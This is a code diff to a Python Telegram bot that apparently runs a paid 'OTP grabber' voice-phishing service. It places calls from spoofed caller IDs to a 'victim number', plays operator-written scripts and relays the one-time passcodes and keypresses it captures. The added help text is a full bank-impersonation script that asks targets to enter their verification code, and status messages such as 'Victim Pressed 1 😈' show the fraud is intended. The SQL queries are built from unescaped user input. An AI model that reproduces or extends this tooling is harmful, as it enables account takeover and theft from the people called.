@@ -499,7 +499,7 @@ Grabs:  {cdata[9]} *""",parse_mode='markdown',reply_markup=keyboard)
 #-------------------------------------------Redeem --------------------------------------------------------------------------------
 @bot.message_handler(commands=['redeem'])
 def redeem_user(message):
-    send = bot.send_message(message.from_user.id, "*Plece your key here*",parse_mode='markdown')
+    send = bot.send_message(message.from_user.id, "*Kindly Enter Your Redeem Code.*",parse_mode='markdown')
     bot.register_next_step_handler(send,redeem_done)
 
 def redeem_done(message):
@@ -525,10 +525,10 @@ def redeem_done(message):
         if uresp==1:
             time.sleep(3)
             days=user_day_check(id)
-            bot.send_message(message.from_user.id, f"Redeemed {days} days.",parse_mode='markdown')
+            bot.send_message(message.from_user.id, f"Your Subscription Is Active For {days} Day.",parse_mode='markdown')
             send_welcome(message)
         elif uresp==0:
-            bot.send_message(message.from_user.id, f"*⚠️Invalid key⚠️*",parse_mode='markdown')
+            bot.send_message(message.from_user.id, f"*Redeem Code Is Invalid ❌*",parse_mode='markdown')
     c.close()
 #--------------------------------------------------------------------------------------------------------------------------- 
     
@@ -605,7 +605,7 @@ def First_Script_name(message):
              print(namesc)
              c.execute(f"UPDATE custom_scripts SET script_name='{namesc}' WHERE script_id={last_message_ids[message.from_user.id]}")
              db.commit()
-             send2 =bot.send_message(message.chat.id, "Send Part One Of Script:\nNote:- Where You Can Say For {Press One}",parse_mode='markdown')
+             send2 =bot.send_message(message.chat.id, "*Send Part One Of Your Script:*",parse_mode='markdown')
              bot.register_next_step_handler(send2,First)
      
 
@@ -616,7 +616,7 @@ def First(message):
              print(script1)
              c.execute(f"UPDATE custom_scripts SET intro='{script1}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send2 =bot.send_message(message.chat.id, "Send Part Two Of Script:\nNote:- Where You Can Say For {Dail The Verification Code}",parse_mode='markdown')
+             send2 =bot.send_message(message.chat.id, "*Send Part Two Of Your Script:*",parse_mode='markdown')
              bot.register_next_step_handler(send2,Second)
 
 def Second(message):
@@ -624,7 +624,7 @@ def Second(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET otp='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Send Part Three Of Script:-\nNote:- Where You Can Say For {Checking The Code}",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "*Send Part Three Of Your Script:*",parse_mode='markdown')
              bot.register_next_step_handler(send3,Third)
              
 def Third(message):
@@ -632,7 +632,7 @@ def Third(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET waiting='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Send Part Four Of Script:\nNote:- Where You Can Say {Code Was Code Rejected}",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "*Send Part Four Of Your Script:*",parse_mode='markdown')
              bot.register_next_step_handler(send3,Fourth)
 
 
@@ -641,7 +641,7 @@ def Fourth(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET wrong='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Send Part Five Of Script:-\nNote:- Where You Can Say For {Your Code Was Accpeted}",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "*Send Part Five Of Your Script:*",parse_mode='markdown')
              bot.register_next_step_handler(send3,Fifth)
 
 def Fifth(message):
@@ -649,7 +649,7 @@ def Fifth(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET last='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Number of OTP digits you want to capture",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "*OTP digits to capture*",parse_mode='markdown')
              bot.register_next_step_handler(send3,OTP_DIGITS)
 def OTP_DIGITS(message):
              id = message.from_user.id
@@ -679,7 +679,29 @@ def Set_custom_script(message):
 
                   last_message_ids[message.from_user.id]=script_id
                   print(last_message_ids[message.from_user.id])
-                  send1 = bot.send_message(id,f"Your script name:",parse_mode='markdown')
+                  bot.send_message(id,"""
+<b>📲 How to Create a Custom Script 📁</b>
+
+<b>Script 1:</b> Introduction  
+This script welcomes the recipients, e.g.,  
+"Hello, this is an automated message from the Fraud Prevention and Risk Department. We're calling to verify recent activity on your account. We noticed an attempt to close your online banking account. If you did not initiate this request, please press one."
+
+<b>Script 2:</b> Request/Instruction  
+This script provides instructions to the recipients, e.g.,  
+"To block this request, please enter the verification code sent to your mobile device. This is to confirm ownership of your %s account. Once done, you may press the pound key."
+
+<b>Script 3:</b> Waiting Period  
+This script is used while the bot processes input, e.g.,  
+"Please wait while we verify your code."
+
+<b>Script 4:</b> Invalid Code Notification  
+This script informs recipients if the entered code is invalid or expired, e.g.,  
+"Sorry, the code you entered is either expired or invalid. Please re-enter the correct details to continue the verification process."
+
+<b>Script 5:</b> Validation/Completion  
+This script confirms if the code is valid and provides final instructions, e.g.,  
+"Thank you for waiting. We have verified your code and everything is back to normal. For further assistance, please visit the help page on your account’s website. Goodbye.""")
+                  send1 = bot.send_message(id,f"*Enter Your Script Name:*",parse_mode='markdown')
                   bot.register_next_step_handler(send1,First_Script_name)
             #   except :
             #       bot.send_message(id,f"*Enter correct format *",parse_mode='markdown')
@@ -911,7 +933,7 @@ def custom_prebuild_script_call(script_id,chatid):
     "maxdigits":"1"
 }
             requests.post(url1, json=data)
-            bot.send_message(chatid,f"""*Call Answered 🗣️*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*Victim Answered 🚀*""",parse_mode='markdown')
 
         
     elif event == "call.hangup":
@@ -946,7 +968,7 @@ def custom_prebuild_script_call(script_id,chatid):
     elif event == "dtmf.entered":
         data = request.get_json()
         digit =  data['digit']
-        bot.send_message(chatid,f"""*Digit Received {digit}*""",parse_mode='markdown')
+        bot.send_message(chatid,f"""📳 Digit Pressed :{digit}*""",parse_mode='markdown')
         
     elif event == "dtmf.gathered":
         data = request.get_json()
@@ -963,7 +985,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
-                bot.send_message(chatid,f"""*One pressed, Send OTP 📲*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*Victim Pressed 1 😈 Send Your Otp.*""",parse_mode='markdown')
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
@@ -977,7 +999,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*OTP Captured {otp2} ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP Received:<code> {otp2}</code> ✅*""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1016,7 +1038,7 @@ def make_call_custon(message):
                         spoof = mes[2]
                         script_id = mes[3]
                         voice = mes[4]
-                        bot.send_message(message.from_user.id,f"""*Call Created*""",parse_mode='markdown')
+                        bot.send_message(message.from_user.id,f"""*Call Is In Progress📲*""",parse_mode='markdown')
                         days =user_day_check(id)
                         c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                         db.commit()
@@ -1040,7 +1062,11 @@ def make_call_custon(message):
                                 time.sleep(3)
                                 b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
                         else:
-                            bot.send_message(message.from_user.id, """*Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
+                            bot.send_message(message.from_user.id, """*Something went wrong, kindly check your format and use the correct format E.G
+
+/scriptcall victimNumber callerId ScriptID VoiceName
+
+/scriptcall 911122334455 911122334455 681797446810593 hi-IN-SwaraNeural*""",parse_mode='markdown')
                     except:
                          bot.send_message(message.from_user.id, f"*Please try again with new script*",parse_mode='markdown')
             else:
